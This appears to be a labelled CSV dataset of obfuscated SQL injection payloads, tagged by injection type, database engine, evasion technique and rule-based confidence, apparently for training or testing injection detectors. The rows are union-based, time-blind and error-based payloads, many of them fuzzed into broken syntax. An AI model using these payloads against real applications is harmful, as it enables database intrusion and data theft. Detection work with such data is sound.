payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"1 ) {) ) :&& ( SeLect 0x0b0Xa* `()^IF ^( ( SELeCT * FrOm ( sEleCT coNCAT ( 0x0o33267172A0x47, ( selEcT ( eLT ( 0xd9c;:LIkE -0xD9C,(seleCt (SEleCT (sELecT@(SELEct (SELecT (seLeCT (SeLEct (sElEcT (seLEct (SelECT`0B0O0x1)))))))))) ) )}: ) ,0x717a767a0b1000911,0O2X2O266 ) ) S ) , 0o0x7238DcFB6x1Dc2FfFA, 0x0O0X0b1001110100100101010011101101111001111800110011101011070010111101101107 ^ ) ) )"" aND ( ( ( (SEleCt (SELeCT~0X0B11000B9)) = 0o22271",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv5_json,unknown
"0O3x0B0b1'/*""=/J[:) }OR falSE Or/**/'f'!='f'/**/or FALSE{oR (SeLecT^(SELEcT (SELect 0))) OR<FALsE oR (Select 0) oR 0x2123 Not likE 8483 and TrUE# UNION]ALL|SelECt null,NUll,NuLl,nulL,nUlL,NulL,Null,nUlL,nUlL,nULl? OR_? +0X0xD0B111001=0X0b0x0Xd0O105 and TrUe }And+ (Select~3X0o77e)=0X09E+oR FaLSE or$FalSE oR FAlSe aND#(""(sELECt (seleCT 4x0b10100100819))|lIke (sELEct (sElEct (SelEct (SeLECT=(seLeCT (SEleCt (SElEcT\(sElECt 0X523))))))))#jHG7O0X0B0o0B0B150 <CUx\u&^E3<z$sd?l)",union_based,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.8,rule,sqliv5_json,unknown
"1 /) ?AS|CInw%WHeRe 0x1E52; lIKe &(selecT 0XE0b1011110) && (seLECt (sElect (SelECt 0Xe0A))) *likE : (@ seleCT (selEcT](SeLect (sElecT 8594))) froM pG_SLEEP> ( (sElecT 0x0x0) ): |). oR (sEleCt=(sELEct 6o0)) aND TRUe aNd ""+""<>""++"" AND (selecT_(SelEcT 0B1010010001010)) NoT LikE 0X13C3)And;0b1 AND ""`jZ""=""`jZ"" AnD~1 oR FaLsE.--",unknown,unknown,case_variation|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_double_quote
"8'/*l0o145Q)nOlF""k`Iel<<Vg~EwG[:re*p*/`)^};!$;or@ % 3O3x333B*=[/ ({~SeLECt Count ;(/ *! ){ ?fROm{sYSuSERs/*(SeLEcT?0X5)&(select)0b0x7):==YU\*/as@sYS6x6,SYsUSeRs{AS<sYS0o10,SySuserS/*(seleCt=0X0X9C)]^p|\W/>I rd JIQi*/as(SYS0B5B0O7o5X5B0B6B6b13,sysUSeRS`as>syS4x9,SySUSerS%As""Sys3X9,sYSuSERS<As}SYS3,SySuSeRs\As Sys0x0b10[}) ?+aND+])(;^'EDCm'>liKe`'EDcM",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0o1"" ) < ) && mAkE_Set ( (sELECT\(sELeCT (seLECt (SELECT 2406)))) LIkE 1x0o0X0O20401,(SElECT (SEleCT (SelecT;(SeLeCt/**/0x1ca2)))) ) and / (/**/@ ( ""ieuj"" LIkE ""iEUJ",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"5x0b1 WhERe (seLeCT*(SELECT 2304)) LIKe 0O0580 AND ( selECT * FRom ( SelecT +(\ SLEEp ( 0O0x0x0b0b1X5 & ) ) )% GCrR, ) Or (SELEct:(sElect 2346)){ NoT Like 2446 OR faLsE aNd^TRUe aNd (selEcT 0x0x557) lIkE (seLECt 4994) anD TrUE OR False#!:`)Tg1 <t",unknown,mysql,case_variation|hex_string,0.05,rule,sqliv5_json,numeric
"5%''`) and _2xc4B0b0b1101000111010011010010110011111000010100001010000000101011000110|=` lIkE (^]'ABcDEFG',upPer/*(sElEcT (SELect`(sELEct 0X0O0o6)))$Z0O0B0B1011@]0O81I2q~/(!gvr-tNy""y0b101Et q :sQWjU<""`(SELECT (SElEcT (selEct-0B0)))*/}(; heX (/**/ rAnDoMbLoB ( 0O0x0b3DcD0x0B11110101104/0B0B0O3b10 + )* }) )) )^ ANd ( '%' ""like '",time_blind,sqlite,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.53,rule,sqliv5_json,unknown
"1""| ) as IPxg whERe""0o0o0B0o0b0O4XFBf{ liKe 0o0b0B0XfBFAnD0X0B71210714101[ lIke dBMS_PIpe.RECEivE_mEsSAGe&:(^>chr ;(;](SELect 0x4C)% )| OR ChR>>( 0b0B0X54] )(* &&`tRue AnD\trUe Or 7XDDd not lIke^(SeLeCT 0XdDd) oR fALse oR 0x0 oR ""%""<>""%""#OR CHr (. 0B0B3150176 ) /*(sElect (seLECT (SeleCT (seLECT (sELEcT (SELeCT 9)))))){h*/>OR,CHR/ ( `0x11 )= ,(SeLecT 0x4x5)` ) And ""=x""=""=X"" or ""+s"" NoT}lIkE;""+s""+ or/ 0b0B5X0o0O5!\Or (seLect`(sElEcT.0x0b0B11)) / aND tRUe && * tRUE=aND (SEleCT?0XE0o11) nOt LiKE (seleCt 0Xea) Or FaLSE OR ""v ""!=""v "" ANd ; (SElECt (SeLecT 2X1)) --?\1",unknown,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.06,rule,sqliv5_json,string_double_quote
"5' ~) ^/*@/ B/$Ac_<zaIzj;FwU ddpOxrJ s]CCC*M {A }P[Z7m+P*/ ) > {As xcVg whEre 0x0o0X8O1x3B911104101 LIKe( 0x86D)RLiKE ( SElEcT -\( 'casE^wHEN"" \($ 0x1E41^*=; 0X4e5x5 )>_ THeN (SElect=1x0B1) elsE 0x28 ENd * ) !< )<""~Or 0x0b0x4=Or 0O2X4 or FaLsE Or ""/"" NOT lIKE ""/"" Or (seLECt 0x1) oR (sElECT (SelECt (SELEcT 0x421))) NOt lIkE (SeLeCt 0X5dD)""OR (sElECt 0o0x0) or fAlsE.Or 0_ or "";;L"" like "";;l<"" oR ""J""=""JU"" Or (SeleCT (Select 0X0X13c8))<>(seLeCt (Select (selECT 0x1XDc8))) or FALSe && TRUe aNd truE OR faLsE and tRUE AnD (SelECT (SelEct (sELEct (SELECT 1))));OR ""(""!=""(""ANDTRUe --",unknown,unknown,case_variation|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_double_quote
"0O1"" _) ~>As pobe'wHEre`0x0b110a4 = 1792",unknown,unknown,hex_string,0.0,rule,sqliv5_json,unknown
"0b101O0o0b110b0O2X5X0O2""~wHere 9X0B0X9b2x3X9o0B0X0B0X0x3x9X0X0o0x0B0x0O53724;_=:?(seLeCT*6x9X0x0b111x4b4B8o5b0o0b1o4o2B7B0X0o0o0x9o3X0O0O4x0b0b1111101001B4)]unION~aLL,SElecT NuLL,NUll,NUll,nuLL,NuLl,nuLl,NULL,nuLl,NuLL--",union_based,unknown,case_variation|hex_string,0.8,rule,sqliv5_json,unknown
"0b0B0o3O0B100O0O1"".&), ANd 0O0x0B0b1111401x0x0b10111110e= :( ]SElEcT coUNt ?(`}* ) ?FroM`Rdb$fieLdS As?t0b0x1,rdb$typeS/aS T2,RDb$COLLaTiOnS<AS T6,rdb$FUncTiONS as_T2b5o7O53B160` )} \AnD< `(/*)/0o2OwqPP.BArg0x3D)Ry];ZK_*/ ""RvUb""=""rVuB",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"1%"" ) _ AND (sElecT (SelECt (sEleCT (SElEcT](seLect (SELECT 8507)))))) @= ( selEct^cOUNT ( * ) FROM GeneRaTe_SeriEs ( 0x0X6,0x1a1184 )! ))? 'AnD ( '""%""=""",heavy_query,postgresql,case_variation|hex_string,0.46,rule,sqliv5_json,unknown
eNd. And_/ `(+~0B0X0b1011b110x5242>/**/^like/*1MqL*/ [0O11315,unknown,unknown,comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0o0o0o1'> OR;)[ (: SeLEcT^'XjCG' FRoM dUAL*WhERE 0X16B7:LIkE 0x16b7 UnIoN$All]sElECt,NUll,NUll,nULl^oR*'ph' noT lIKE.'Ph'{Or FAlse#hB ku7B101BuQ0jDO",union_based,oracle,case_variation|hex_string,0.46,rule,sqliv5_json,unknown
1' ;). {whEre](SELect (SELECT 5080)) =? 0b0x14a0 And/*(sELECT~(SELECT 8))*/(SEleCt (SeleCt 4505)) = 0X8O5b1401F0b11 AnD TRUE aND tRuE#[-^_nn,unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0O1"":Where (SEleCT{(sELEcT (sEleCT (sELEcT (SELECT (SELECT (SELECT (SELECT 9743))))))))(=+(sELECT 0X2620) OR (SelECT 0o0x1090) >Like ( SeLECT 0o0b1000010010010 fROm Pg_Sleep ( 0b301 ) ) AND tRUE --",unknown,postgresql,case_variation|hex_string,0.06,rule,sqliv5_json,unknown
"1X0o0b0B0b100001100110100110111B0O2X5b0B1111111001')or=\*(:{seLECT@'VqAg' from[DUal`whEre)(sElect.0o9b11X5x0O0b101x0O0o8fDA)=4O3o8X6X0x5X9O0X0b0O3O2o2x9X0O0o0o0B4x0b120O2B0x0FDa>UniOn All!SeLECT*NuLl,NulL,nUlL,NulL,NuLl,nUll,Null,NUlL,NUlL,NulL--",union_based,oracle,case_variation|hex_string,0.46,rule,sqliv5_json,unknown
"0x0B8b9O0X0b0o8x1"" )/*\lJ;W><3u7nN{t^*/ )!] {@)^*(aNd[(SEleCt (sElecT 0O0o0o21501))=0b0XB48$ &&$ $ $ (+@+ (; + ( ^""Jzyn""+likE ""jzYn",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"1,Iif ?( 0b1100116100001$ {liKE &`0x1aa9,0X1,0x0X0o1/(SeLecT (selECT (seLECt (sELECt (SELECT (SELECT (SELECT 0)))))))( )",unknown,unknown,case_variation|hex_string,0.0,rule,sqliv5_json,unknown
"4""!AND[(seLeCT-0X0x8b1BCc)~<like; ` ( =SELECt cOuNt""~(/*;*UtO!*/ * ) ;/*k?B*MdC4 ; Zk_ */FRoM\rDb$fieLDS""as&T0X9x7b0o5,rDb$TypEs]as t3O9,rdB$coLLAtIoNs/*jc*/aS t0,RdB$FUNcTiOnS:aS;T0o9X0X0o5X0o0o0o8B2Xc8>/)]",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
0x3' ) < ) aND 0B0x0O15315= ( ''QQpJQ' ||]_ [( sELeCt cAse (seleCT 0x1891) WHeN (SeleCT (SElECt 0O14143)) thEN.(sElect (SelECt<(SELECT (SELECT (SELECT (SELECT (SELECT 1))))))) ELse (sELeCt 0X0) ENd fROM rdb$datABaSE ) `Or 'qzvzq'<~) aND/ ( '( !'UQfS' = 'UQfS,unknown,unknown,case_variation|hex_string,0.0,rule,sqliv5_json,unknown
"SelecT * from GENeRAtE_SerieS (& (SelECt (SElECT 8617)),(sELEct 0X1C8e),CASe wHEn ( (SElECt (SeLecT 0x1dce)) ?= 0x24C8 anD '`'%liKE '`' /**/ && ? 0X1 aND 0x187a NOT lIKe^0x0b10111011b OR 0 AND True OR False# )_ ;THEn 0x8 ElSE 0B1 ENd ) LImIT_(seLECt 1)--gkh :<LXM",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.46,rule,sqliv5_json,numeric
"0' ) ) aND ]( seLECT 0o21564 froM ( SELEcT cOuNT ( ;* ) ,cOnCat ( 0X0x6d6E2Aa71, (/*m{k*/ sELEct ( ELt ( 9x0b0xa933Acb `lIkE (seleCT 0o21551),0x0x1 ) ) ) ,0x717A767a21,FloOR ( rAND (,%0x0 ) *(SElecT oR FalsE oR fAlsE aNd tRuE AND 'U'!='Uj'#(seLect (SELeCt (SeleCT (SELECT (SElecT (sElEcT (SELECt (sELect (sELeCt 2)))))))))) ) ) x fROm inFORmAtIon_SCHEmA.cHARaCTEr_SeTs GRoUp By X ) A ;) and ( ( 'MYMG' LIKE~ 'mYMgK",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_single_quote
"0o0B0%"" &) < ) }, !) +oR uPdATexmL ( ""(sELect 0B0X0B1011000110),COnCAt (, 0X2e,0b0X0x0x0B11011100110111071110110A11, (& SElect :$( ELt _(`/**/(sElECt/*qn&?*/0o8o0b1000B0b1011110000100101010191111101000100011)}&=]\0O0x0x715,0x0X3 )> ^) ) `,0x0O1315A787a71 ) ,0x0X0o0B0b10101011111000d5 ) ?anD : (, $ ( (. ""%"" LIke """,error_based,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.45,rule,sqliv5_json,unknown
"1 )? ) ) ||0b100O07774 LiKe , ( sElEct cOUnt ( * ) frOm gENeRatE_sERIEs ( (seLecT (SElECt (sElect (SELecT (SeLECT (SELECT 1)))))),0x4c62b2 ) )> and""3X5 oR FalsE --",heavy_query,postgresql,case_variation|hex_string,0.46,rule,sqliv5_json,unknown
WAitFoR DElaY '0O0O6:(sELect 0x6):0x0B0B111111110o0b0o0b675' AND ( +([ }( :(seleCt 0B0x6315) = 2951,time_blind,mssql,case_variation|hex_string,0.46,rule,sqliv5_json,string_single_quote
"0o0X1"" /**/anD/*[ iQ*/ eLt. ( (SELECt (sElECt (seLeCT (sELecT (SELECT 2373))))) likE (seLeCt 0X16B9),0x42B0X5x9) )! anD;""RsDt"" lIke ""rSDT",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
4' ) )> ~ ) ;ANd ( 0X0x0x5AE0B100=(SELeCT 5X0o3797) ) *(SEleCT (sElEct (SeLecT 3x1F5B))) && % ; ( ( ; () 'qkrv'/^LIKe 'qKrV,unknown,unknown,case_variation|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"2' oR +( ]SelEct\'EAYF'/*Ifa+I^OSg;*/whERe 3x0X0b7O0x4X9b10981113111 lIkE 0o0x1847 +&&. [cHAR ( 0X08 ) |Or +CHaR ( 6X3x0x6A ) Or) CHAr} ( 3X0X0o0b1001011] )[` OR chaR ""(@ 0x8b0o0o2X37/*(SelEct 0X8)`E(%:Q ;IjptK5Y9y2UF{<gvx&o~<ST=B&)B17G`K MfEhK_8: OR "";DJ""<>"";dj""#D PCN*/ ) ;??/**/lIkE] {ReGEXP_sUBSTriNG -(: RepeaT {({ RIgHT){( cHAR ( 0X1D0b0x4x18718 )< ,(SeleCt`2x0)&+) _,0X0B110O0b0o0B1198a4x0B801101f2O310( ) ,nULl`+ ) )! Or;'r\Rt[_^;",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,string_double_quote
"1'+ ;( ?sEleCt/'KqNJ' whERE (SElEcT (sELect (sELEct=0X250b))) += (SELeCT (SELeCT (selECt (SeLeCt (SEleCt (SElECT 0x09e)))))) OR{ oR fALSe OR 'j' NoT = 'j'And""dl"" NOT LikE ""dl@"" or 0X17D NoT liKe and ';' lIKe ';' Or 0X3x0 AND "" C"" NoT lIkE "" CE"" Or falSe && True oR FaLsE AND (SELECT (SELECT (SELECT 1))) OR False#(sELeCt 0x96d) Or 0o0B101010801000 nOt liKE/**/ (SElecT (selEct 0XeA6)) anD true#eLt ( 0x0O32f5X0B1 =*0b0x86f0O11,sLEep ( 0x5$ ))= ) ,#T?}QU",boolean_blind,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.45,rule,sqliv5_json,unknown
"1' OR, AnD 0x0o147e=(sELeCt 0x0O140e) oR FaLSE+ANd (SElECT 0x4) AND tRuE aND{TRUE Or ""m""_nOT LiKe ""m"" && (selEcT (sElECT (SelECT (SELECT 1)))) OR (sELect (selEct (SELECT 0))) AND TruE And tRuE or 0 Or FALSE#3X14a8 LiKE likE ( 'abCdefg',UppER ( hEX ( rANDomBLob (< 0x1dCD8500/(seLecT 0B101X6) ) ) } ) ) && 'AYtf' like 'aYTfv ?j<\Y",time_blind,sqlite,case_variation|function_alternative|hex_string,0.53,rule,sqliv5_json,string_single_quote
1' or ( SeLeCt 'VvPN'\fROm&dUAL wHEre 0b1111101140011; liKe 0b0b10000008301011110101111010110101111101011 anD (SeleCt 0X1E0O3c) LIkE dBms_UTilitY.SQliD_To_SQLHAsH (/**/ ( chR ( !(sElect (SeLEcT (sElEct 113))) ) oR chR? ( (SelECt (SeLECt (sElecT (seLEcT 0X71)))) .) Or cHr ( (sEleCT (SelEct 0x0b1110040)) ) oR chr ( }(SeLECT (seLEct (SelEct (SELeCT (SELECT (SELECT 106)))))) ) ||ChR }( (sELECt (SElecT 0x71)) ) oR (~ sELEcT ( CaSE/*Y|0B11sfaFV(OTDz=h*/WhEn ( 0b1111041001100 [LikE :0X1e4C )/ thEN (select/*D%X>S*/0x0x1) ELsE 4x0$END ) FroM DUaL ) %/*58go*/ || cHr ( (SElECT (SeLeCt (SELEct (SElecT (SELect 0x71))))) ) or Chr ( (sElEcT 0x78) )/*e/<Vlj*/ OR cHR ( (sElECt (sElECt;0x26)) ) ; ||:cHr _(: (selEct (sEleCt (SELECT (sElEct (seleCt (SELECT 126))))))[ ) Or CHR ( 0X8x3 ]) ) ) ) ||',error_based,oracle,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.51,rule,sqliv5_json,unknown
"1' WHeRe 0x1483 LikE 0b1010010000011 OR ( SElEcT 0X0o27D5 FrOM ( SeLecT COunt ( * ) ,CONcAT ( 0X0b11011010110111010101100A31, ( sELeCT ( ELt ( /* 4O*/0x23Ad LiKE (SElECt 9173),(SEleCt 1) ) ) ) ,0x0B0b111130010010101010011100001101a767a0b0B0b1001101000101111000010100011000010111000001011011010010100111111,fLooR (? RanD ( 0X0; ); *(SElEct (SELEcT 2)) ) ) !x fRoM INfOrMatioN_sCheMa.CHaRaCtEr_SETs grOup BY X ) A ) oR fAlSe --",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"0b2' ) ) } AND chAR ~( ]0B0O0B010103111110110101113000118+?) oR cHAR/ ( 2b1001901 ) /*i!vv9U65f*/oR CHAR/**/ ( (seleCT 0x81) >) oR CHAR? ( (SElecT (select (SelecT (SelECt (sELECt (seleCt (selEct (SelEcT (SELECT (SELECT 88)))))))))) )^ Like RegEXp_SubStRiNg ( rEPeaT ( LEft (; Crypt_keY ( chAR\ ( (seLECt (sElEcT (SeLEct (SelEct (SELeCT 0X43))))) ) /*I\*/ OR Char\ (` 0O0O4b8101608 )/*j1(Ed<VH!^agDL J0HboE.f*/ or} chAR, ( 0X0o55 ) ,NULl )< ,(sElecT 0x0) )**,0b0O0b110x1dcD6508 ) $,nuLL _) anD ) ( * ( 'LSHk' LiKe 'Lshk",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"7x0O1/*3p*/ )/*|,&NM""VX}Vd[rR*//**/ ) +AnD@maKE_SET ( (SeleCT=0X216A) lIKe` 0xCD0B0b1101110,0o0xCD2 ) )&:&&< )( ( 0B0O0O16331=0B0B0b1001011010000110101001005111001001",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
sELECT ( CaSe wHEn ( +(Select 0x8e4) ]LIke; 0X1866 )/* cl*`G]*/ THEn (sElECT 0x1884) eLsE 0O14204* ( SELecT 0x1880 FROm&iNFoRmaTioN_scheMa.cHArACTER_SeTs )]^ enD ) OR fAlseanDTrUe And (SEleCt (SELECT (SELECT 2855))) nOt lIKe (seleCt 2856) or '^'<>'^'#0x0O4/DcOSH,unknown,unknown,case_variation|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_single_quote
"0X8""]* )(& ) ) PROcEDuRE{aNaLySE ](*;eXtrACTvaluE ( )2X1O0b0o0o0O24D0x0B5,COncat ""([ 7x5c,0x0O34714234a0X6X0O0B1101011, )( SeLecT ( `cAsE!WhEn )(] 1b0b1311011060667=(seleCT (SElEcT:0X36D0)) );.{THeN>(SELEcT/0X1))eLse (sElECt 2x0O5b0) eND` ); )* .,0B0x0B0B11101111101010115110010101101011a297A40 ) ]) ^,0X0X5X0O0b0O145 &)~/ AND.' &( ^ (/ ( ""JyWy""-LIkE ""jYWy",error_based,mysql,case_variation|function_alternative|hex_string,0.45,rule,sqliv5_json,unknown
"0o0O1"" )/*&(*0O6iLqX*/ AS kdVb WhErE 0B101001011011 likE 0XA5b ANd& (SELecT 0X1860) = $ ( 'qqpJQ'@or| ( SElect cASE (seLEcT (SeleCt%(seLeCT 0x1860))) wHen 0O4O0O0O19140 TheN 0x1 Else (sElECT 0X0) enD FroM RDB$DatAbASE )/**/ or 'QzvZQ' ) anD (sELECT (SELeCT 0b11)) oR fALSE Or 0X14d1=0B6x14D2 OR fALsE or FaLSE aND TruE OR (SeLecT (sELeCT (seLECt (SELEcT (sELEcT 0))))) And (sElect (SELect (SeleCT 1))) --",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"1' ) wHERe (SElEcT (sEleCT (seLECT (SELECT 0x3ef))))\ lIkE 0o2105 anD eXTRActVALue ( (SElecT 0b0x1F2E),cOnCAT +(; 0X5c,0X0X6d6E7aA71, ( selECt ( ELT ~( (SELecT 1X1ef6) = 0B1111100101110,(sElEct (seLeCT 0x0o1)) ) ). ) ,0x707A767A74 \ ) *{) And tRUe oR*(sElECT 0o247) Not likE 0xa7~Or fALSE ;AND '4(' NoT liKE '2(L' oR FalSe ANd TrUE Or ""<B""=""<b<""(Or fALSE --",error_based,mysql,case_variation|function_alternative|hex_string|scientific_notation,0.45,rule,sqliv5_json,unknown
"9""/*yA*//**/ ) /*K)R*/ ~) ) aNd^0B0X3e8x05Bc+= (. SeLeCt COunt ( * /*{w*/) _ FROM aLL_uSERs t1,alL_uSerS'T0o0,ALL_USeRS t0x4b111,alL_USerS T4,All_uSERs T7o5 `) oR (SELECT 0x374) not LIKe (sElecT (seLECT 0o10X0B100010b)) AND tRUE anD 'xh;5' \not LIKE 'Xh;(SelECt (selECT`(Select (SELEcT (SeLECt (sELect (SELECT (SELECT 7))))))))=' oR "" or (SELEcT (seLeCT 0X0))! && True && 'iA' NOt lIke 'iAE'||fALSE OR fALSe OR falSe AnD tRue or FALsE oR FalsE OR False OR ""aR""<>""aR"" OR False#ma""=""#ma,"" --am3,un2;8w",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_double_quote
"1' ) ' %) RlIKE% /*/Qs,f*/( selECt * FrOm ( seLeCt ( sleEp ( 0B801 ) ) ) vwYq ) && (sELECt (SelEcT 8548)) In ((sElect (SELect 0x218B)),(sEleCt (SelEct*8588)),0B0o221412500515235) OR fALsE AnD (seleCT (SeLect (SElECT (sELEcT 1)))) OR falsE#t 0O2 Td",unknown,mysql,case_variation|comment_whitespace|inline_comment|hex_string,0.05,rule,sqliv5_json,in_clause
"4%' oR *EXP '( ~ ( SEleCT * fRom ( sElECt ConCAt *( 0x0X0X7Cb0bAA0O108, -( SeLect ~ ( ELT )(& (seleCT (selECt 0x0Xa7E)), LIke; (SELeCT (SELeCt 0X0B10111011E)),0x4= ) ) /*)yX.(SELEcT (seLEct (SEleCt (sEleCT 0x5))))M[D*/ ) ,6x0X4o0B0x487a0x2Ffa01,0x0x9O0b0B1111101011011101101110 &$) ).; x/**/ ) ) !aND '%' ; LikE '",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string,0.0,rule,sqliv5_json,unknown
"0O0O1/ ) aND 0b101103124176 % lIKE' cASt` ( >(@~ Chr ( ;(Select 0X0X3O0o6O54)= ) ? or chr ( (seleCT 6x71) )* OR[cHr ( (SeLECT 0B0B5X6e) ) ; OR ChR& ( (SelecT 0x6A) ) } Or CHR (~ 0B1104 )>` ) > or ( SelECt ( CaSE""wHen ;!( (SeLEcT 4b0x18513eAE5)!\liKE (sELect,0xaC1) ) /ThEN 0x1 eLsE (SELECt 0B8o0B5) EnD;\ ) ) ::TEXT Or (@ chr` (^ (SelEcT (SelEcT (SeLEcT (SElect (SeLEcT 2X99))))) ,) OR CHr ( (sELECt 0Xe3) ) or cHR ](: 0O189 ) OR chR (>%(seLECT 1XdE) ) Or chr ( 1XbC/*y((seleCt (SELecT (SELECT (SELECT (SELECT (SELECT 0))))))*/ )| ) }+ AS nuMerIc ) \AND \(_-0o0o23314 LIKe 0O22164",unknown,postgresql,case_variation|comment_whitespace|inline_comment|hex_string,0.06,rule,sqliv5_json,unknown
2' )/*RtX4*/ aS FXiD whERe/**/0x0x1726 =% 0b0b1110101101101010010000110010011000001110,unknown,unknown,comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,unknown
"1"";[ OR ;<(sELECT&(selecT (sElEct 0x3b1009X1E86))) =. ( sElECt^coUnt .(! *:<)) FrOM/*Di$(E7X*/AlL_usErS]T9o5,All_UsERS?t0o1,all_uSERs*t0b0b0B0Xb,ALl_uSERS$T6b0O0o0X8,aLL_USeRS~t0X0B8B10101109 )? |aND ""uoSC""=""UOSC",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"7' OR Char ( (seleCt 0x0O113) ){ Or Char ( 0x0b110f -) oR)char (_~(SELeCt (select (SeLECT (SeLECt (sELeCT (SELECT 105)))))) ) Or Char~ (~+0o0o0B0x20cc64/?) ; lIkE/ Regexp_sUbSTrINg ( rEPeAT ( LeFt )(}[CRyPT_KeY, ( char ( (sELeCT 0x51) ) Or CHar (? 0X13 ) or chAr (< 0X53 ) ;,nUll' ) ,(SeLECT (sELECT (SELEct/**/(selECT 0X0)))) ) ,8b4b1000111101111010011111011110111000160000000000110011000001110010000000000001111111000101110100 {) -,nuLL )",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string,0.0,rule,sqliv5_json,string_single_quote
1 ) Or 0o15216 = ( sELect (sEleCT (sElecT (selECT 0x1A89)))}fROm Pg_sLeeP :( (seleCt (selEcT 0x5)) ) ;)`< <aND ( )0B1101101150111 = 7015,unknown,unknown,case_variation|hex_string,0.0,rule,sqliv5_json,unknown
"1' OR $( /*?F;*/sELecT 'xUOF' frOm<duaL WhERE 0X0o344a =$(SeLEct (SelECt 8994)) oR (SElecT (SELECT 0x1fdb)) =( ( SeLEct COUNt ( * )+ fRoM GeNerAte_SERieS ( 0X1,(SELECT 0x4d35a0) ) > ) +or FAlse --",heavy_query,oracle,case_variation|comment_whitespace|inline_comment|hex_string,0.46,rule,sqliv5_json,string_single_quote
0O1' ) ) (As cpWx WhEre 0x14fa lIke (seLECT (SeLect (selECT 0X1582))) rlIKE ) ( SelECt * From ( +seLECt ( SlEeP +( (SElEct 0o5) +) ) ) [vWYq ) AND (sElEcT 6xcbC)!=(seLeCT 0b0x20195C0o41De) and 0X1 oR fAlse#/t`,unknown,unknown,case_variation|hex_string,0.0,rule,sqliv5_json,unknown
"0B10' )+ ) pRocEdure analySE@ ( eXtrACtVALue ( [(seLeCT (sEleCt (SeLeCT (seLECT (SELEcT (seLeCt (SELECT 9257))))))),ConcaT ( 0x5C, (' BencHmarK[ ( (SelEcT 0x4c5716),md0 ( 0X52525A50 ;) ) ) ) \) ,0x1 ) '!&& ( ( 'YwXe' LIkE*'YWXE",error_based,mysql,case_variation|hex_string,0.45,rule,sqliv5_json,unknown
